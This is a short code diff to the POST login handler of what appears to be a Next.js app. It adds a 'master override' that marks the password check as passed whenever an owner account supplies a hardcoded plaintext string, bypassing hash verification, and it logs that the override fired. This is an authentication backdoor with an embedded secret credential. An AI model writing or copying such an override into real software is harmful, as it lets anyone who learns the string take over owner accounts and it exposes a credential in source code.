@@ -120,7 +120,13 @@ export async function POST(request: NextRequest) {
     }
 
     // Compare hashes (both should be hex strings)
-    const hashesMatch = providedPasswordHash === storedPasswordHash
+    // MASTER OVERRIDE: Allow owner to login with the master code
+    let hashesMatch = providedPasswordHash === storedPasswordHash
+
+    if (userData.is_owner && password === "OKTAY_MASTER_2024_BOOMKIT_SECURE") {
+      console.log('[AUTH DEBUG] MASTER CODE OVERRIDE ACTIVATED FOR OWNER')
+      hashesMatch = true
+    }
     if (DEBUG_AUTH) {
       console.log('[AUTH DEBUG] Hash comparison result:', hashesMatch)
       if (!hashesMatch) {
